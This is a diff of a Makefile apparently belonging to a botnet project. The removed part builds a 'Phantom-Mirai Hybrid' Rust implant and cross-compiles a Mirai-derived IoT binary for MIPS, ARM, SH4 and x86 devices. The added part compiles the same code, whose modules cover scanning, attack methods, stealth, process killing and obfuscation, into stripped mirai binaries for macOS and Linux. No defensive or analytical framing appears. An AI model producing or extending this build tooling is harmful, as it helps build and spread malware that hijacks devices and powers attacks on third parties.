@@ -1,72 +1,44 @@
-# Phantom-Mirai Hybrid V3 Centralized Build System
+# Pure Makefile for Cloud Component
 
-# Directories
-DIR_IOT = crates/nodes/iot
-DIR_PHANTOM = crates/nodes/phantom
-DIR_TC = scripts/toolchains
+CC ?= gcc
+DIST_DIR ?= dist
 
-# Toolchain Paths (Adjust based on extracted folders from setup_toolchains.sh)
-# Examples based on standard RootSec naming
-CC_MIPS = $(DIR_TC)/cross-compiler-mips/bin/mips-gcc
-CC_MIPSEL = $(DIR_TC)/cross-compiler-mipsel/bin/mipsel-gcc
-CC_ARM = $(DIR_TC)/cross-compiler-armv4l/bin/armv4l-gcc
-CC_ARM7 = $(DIR_TC)/cross-compiler-armv7l/bin/armv7l-gcc
-CC_SH4 = $(DIR_TC)/cross-compiler-sh4/bin/sh4-gcc
-CC_X86 = $(DIR_TC)/cross-compiler-i586/bin/i586-gcc
-CC_X86_64 = $(DIR_TC)/cross-compiler-x86_64/bin/x86_64-gcc
+# IoT Sources
+DIR_IOT = crates/nodes/cloud
+IOT_CFLAGS = -Wall -Wextra -O2 -std=c99 -D_GNU_SOURCE
+IOT_CFLAGS += -I$(DIR_IOT)/modules/network/dns -I$(DIR_IOT)/modules/network/p2p -I$(DIR_IOT)/modules/network/proxy
+IOT_CFLAGS += -I$(DIR_IOT)/modules/network/scanner -I$(DIR_IOT)/modules/network/proto
+IOT_CFLAGS += -I$(DIR_IOT)/modules/attack -I$(DIR_IOT)/modules/attack/methods
+IOT_CFLAGS += -I$(DIR_IOT)/modules/system/stealth -I$(DIR_IOT)/modules/system/killer -I$(DIR_IOT)/modules/system/obfuscate
+IOT_CFLAGS += -I$(DIR_IOT)/modules/crypto -I$(DIR_IOT)/include
 
-# List of IoT Architectures to build
-IOT_ARCHS = mips mipsel arm arm7 sh4 x86 x86_64
+IOT_SRCS = $(DIR_IOT)/main.c \
+           $(wildcard $(DIR_IOT)/modules/network/*/*.c) \
+           $(wildcard $(DIR_IOT)/modules/attack/*.c) \
+           $(wildcard $(DIR_IOT)/modules/attack/methods/*.c) \
+           $(wildcard $(DIR_IOT)/modules/system/*/*.c) \
+           $(wildcard $(DIR_IOT)/modules/crypto/*.c)
 
-.PHONY: all phantom iot clean $(IOT_ARCHS)
+.PHONY: cloud_macos cloud_linux_x64 cloud_linux_arm64 clean
 
-all: phantom iot
+# MacOS Native (Host)
+cloud_macos:
+	@mkdir -p $(DIST_DIR)/cloud
+	$(CC) $(IOT_CFLAGS) -o $(DIST_DIR)/cloud/mirai.macos $(IOT_SRCS)
+	strip $(DIST_DIR)/cloud/mirai.macos
 
-# --- Phantom (Rust Implant) ---
-phantom:
-	@echo "[+] Building Phantom Core (Rust)..."
-	cd $(DIR_PHANTOM) && cargo build --release
-	@echo "[+] Phantom Built: $(DIR_PHANTOM)/target/release/phantom_core"
+# Linux x86_64 (via Zig)
+cloud_linux_x64:
+	@mkdir -p $(DIST_DIR)/cloud
+	zig cc -target x86_64-linux $(IOT_CFLAGS) -o $(DIST_DIR)/cloud/mirai.linux.x64 $(IOT_SRCS)
+	strip $(DIST_DIR)/cloud/mirai.linux.x64
 
-# --- IoT (Mirai-Lite C) ---
-iot: $(IOT_ARCHS)
+# Linux ARM64 (via Zig)
+cloud_linux_arm64:
+	@mkdir -p $(DIST_DIR)/cloud
+	zig cc -target aarch64-linux $(IOT_CFLAGS) -o $(DIST_DIR)/cloud/mirai.linux.arm64 $(IOT_SRCS)
+	strip $(DIST_DIR)/cloud/mirai.linux.arm64
 
-# Individual Arch Rules
-mips:
-	@echo "[*] Building IoT for MIPS..."
-	$(MAKE) -C $(DIR_IOT) CC="$(CC_MIPS)" TARGET="mirai_mips" clean all
-
-mipsel:
-	@echo "[*] Building IoT for MIPSEL..."
-	$(MAKE) -C $(DIR_IOT) CC="$(CC_MIPSEL)" TARGET="mirai_mipsel" clean all
-
-arm:
-	@echo "[*] Building IoT for ARMv4..."
-	$(MAKE) -C $(DIR_IOT) CC="$(CC_ARM)" TARGET="mirai_arm" clean all
-
-arm7:
-	@echo "[*] Building IoT for ARMv7..."
-	$(MAKE) -C $(DIR_IOT) CC="$(CC_ARM7)" TARGET="mirai_arm7" clean all
-
-sh4:
-	@echo "[*] Building IoT for SH4..."
-	$(MAKE) -C $(DIR_IOT) CC="$(CC_SH4)" TARGET="mirai_sh4" clean all
-
-x86:
-	@echo "[*] Building IoT for x86..."
-	$(MAKE) -C $(DIR_IOT) CC="$(CC_X86)" TARGET="mirai_x86" clean all
-
-x86_64:
-	@echo "[*] Building IoT for x86_64..."
-	$(MAKE) -C $(DIR_IOT) CC="$(CC_X86_64)" TARGET="mirai_x86_64" clean all
-
-# Local Debug Build (Host OS)
-iot_debug:
-	@echo "[*] Building IoT for Host (Debug)..."
-	$(MAKE) -C $(DIR_IOT) clean all
 
 clean:
-	@echo "[-] Cleaning Phantom..."
-	cd $(DIR_PHANTOM) && cargo clean
-	@echo "[-] Cleaning IoT..."
-	$(MAKE) -C $(DIR_IOT) clean
+	rm -rf $(DIST_DIR)
